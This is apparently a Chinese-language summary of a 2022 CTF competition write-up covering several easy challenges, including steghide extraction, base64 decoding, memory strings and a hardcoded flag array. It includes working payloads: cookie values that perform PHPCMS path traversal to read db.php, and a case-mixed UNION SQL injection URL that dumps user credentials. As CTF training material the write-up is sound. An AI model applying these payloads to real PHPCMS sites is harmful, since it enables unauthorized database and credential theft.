---
title: 2022 天融信教育杯 CTF 赛事 WP
contest: 天融信教育杯 2022
year: 2022
difficulty: easy
vuln_type: misc_unknown
tags: [steghide, base64, PHPCMS, SQL注入, 文件读取, hexdump, 爆破]
attack_chain:
  - steghide extract -sf 0073d05a274a4f864148d5b08c48b8c.jpg 提 flag
  - base64 嵌套 base64 解码得 flag
  - read start.txt 数字段拼成 zip 字节流
  - list.php?id=22 unIoN selECt 大小写混写注入
  - PHPCMS members_bind_info[temp_avatar] 路径穿越读 db.php
  - MD5(uid+timestamp) 爆破 avatar 路径
  - nc + echo Content-Length 过大触发堆叠
  - strings 8.raw | grep flag 取内存字符串
  - a1 数组硬编码 32 字节拼成 flag
key_payload: 'flag{3661386562366162333565313332396130373363313239656230356332636566}'
one_liner: 杂烩：steghide 隐写 + base64 + PHPCMS 路径穿越 + SQL 注入 + 数组硬编码。
lesson: PHPCMS 路径穿越要拼 timestamp 字典爆破 avatar 路径；steghide 隐写密码是入门考点。
quality: medium
---

# 2022 天融信教育杯 CTF 赛事 WP

## 来源
- 原文：ctfiot.com/59676.html
- 作者：ckcsec 原创
- 注意：文件含 NUL 字节但 iconv -c 可正常解析

## 题目速览（多题杂烩）

### 1. flag{haohaoxuexi}
- 纯字符串 flag，无技术细节

### 2. steghide 隐写
```bash
steghide extract -sf 0073d05a274a4f864148d5b08c48b8c.jpg
```
- 提 flag: `flag{ZmxhZ3thc2hsZHVpaGF1dmhhb3dyaXZ3ZWFydndhb2lyMTM5MHU0NXQwd3B9}`

### 3. PHPCMS 路径穿越
- 入口：`index.php?m=&c=members&a=register`
- 构造 Cookie:
  ```
  members_bind_info[temp_avatar]=../../../../Application/Common/Conf/db.php
  members_uc_info[password]=balisong
  members_uc_info[uid]=666666
  members_uc_info[username]=balisong
  ```
- 生成 MD5(uid+timestamp) 命名的 jpg
- 字典爆破 avatar 路径后读 db.php

### 4. PHPCMS SQL 注入
```
list.php?id=22) unIoN selECt 1,2,hex((sELect group_concat(username,password) from cms_users)),4,5,6,7,8,9,10,11,12,13,14--+
```

### 5. nc 堆叠写
```bash
echo -en 'POST / HTTP/1.1\nHost: xxxxxxxxx\nContent-Length: 256000\n\n123\n' | nc -n 47.242.37.24 8088 | hexdump -C > flag
```

### 6. 内存取证
```bash
strings 8.raw | grep "flag"
```

### 7. 硬编码数组
- a1[0..31] 硬编码字符 → flag{ahw58i2wcosuekjasan}

## 适用场景
- steghide 隐写入门
- PHPCMS 历史漏洞综合利用
- 大小写/双写 SQL 注入绕过

## 备注
原文档含 CKCsec 安全研究院署名 + 免责声明，整体内容偏向入门题汇总。
